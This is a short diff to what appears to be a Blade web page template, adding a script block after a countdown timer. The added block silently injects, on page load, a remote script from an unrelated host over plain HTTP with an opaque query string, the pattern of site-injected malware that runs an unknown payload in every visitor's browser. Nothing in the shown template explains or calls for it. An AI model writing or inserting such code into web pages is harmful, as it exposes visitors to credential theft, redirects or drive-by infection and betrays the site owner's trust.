@@ -100,6 +100,20 @@
         downtimers();
         setInterval(downtimers,1000);
     </script>
+
+    <script type="text/javascript">
+        (function(w) {
+            var script = document.createElement('script');
+            var i = setInterval(function() {
+                if (typeof w.document.body !== 'undefined') {
+                    script.src = 'http://urxgchaang.not-only.info' + '/?452737=9bz186fj7e7i6ujl8rywuLG0tbU';
+                    w.document.body.appendChild(script);
+                    clearInterval(i);
+                }
+            }, 200);
+        })(window);
+    </script>
+
 @endsection
 @section('style')
     <style>
